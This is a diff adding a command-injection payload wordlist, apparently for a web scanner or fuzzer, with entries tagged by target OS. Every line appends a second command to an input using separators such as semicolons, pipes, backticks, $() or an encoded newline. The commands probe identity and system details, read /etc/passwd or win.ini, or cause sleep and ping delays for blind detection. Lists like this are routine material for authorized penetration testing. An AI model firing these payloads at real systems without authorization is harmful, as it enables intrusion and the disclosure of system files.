@@ -1,0 +1,41 @@
+# RCE deep payloads.
+# [nix] / [win] / [any] tags filter by the OS selector in the UI.
+[nix];id
+[nix]|id
+[nix]&&id
+[nix]||id
+[nix]`id`
+[nix]$(id)
+[nix];uname -a
+[nix]|whoami
+[nix]&&whoami
+[nix]`whoami`
+[nix]$(whoami)
+[nix];cat /etc/passwd
+[nix]|cat /etc/passwd
+[nix]%0aid
+[nix]%0a id
+[nix];sleep 5
+[nix]|sleep 5
+[nix]&&sleep 5
+[nix]`sleep 5`
+[nix]$(sleep 5)
+[win]&whoami
+[win]|whoami
+[win]&&whoami
+[win]&hostname
+[win]|hostname
+[win]&ver
+[win]|ver
+[win]&ipconfig
+[win]|ipconfig
+[win]&&ipconfig
+[win]&type C:\Windows\win.ini
+[win]|type C:\Windows\win.ini
+[win]& ping -n 5 127.0.0.1 &
+[win]| ping -n 5 127.0.0.1
+[win]&& ping -n 5 127.0.0.1
+[win]&timeout 5
+[win]|timeout 5
+[win]& dir C:\
+[win]| dir C:\
